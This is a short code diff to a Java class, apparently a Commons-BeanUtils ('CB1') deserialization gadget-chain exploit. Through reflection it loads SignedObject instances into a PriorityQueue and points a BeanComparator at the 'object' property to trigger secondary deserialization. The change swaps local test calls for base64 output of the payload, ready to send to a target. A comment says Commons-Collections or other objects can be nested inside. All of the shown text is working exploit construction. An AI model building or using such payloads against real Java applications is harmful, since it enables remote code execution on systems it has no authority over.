@@ -37,8 +37,9 @@ public class CB1 {
         ReflectUtils.setFieldValue(priorityQueue,"queue",new SignedObject[]{signedObject,signedObject});
         ReflectUtils.setFieldValue(beanComparator,"property","object");
 //
-        SerialUtils.serialize(priorityQueue);
-        SerialUtils.unserialize();
+//        SerialUtils.serialize(priorityQueue);
+//        SerialUtils.unserialize();
+        SerialUtils.serializeB64(priorityQueue);
 
     }
     // here can be CC object or others need to deserialize.
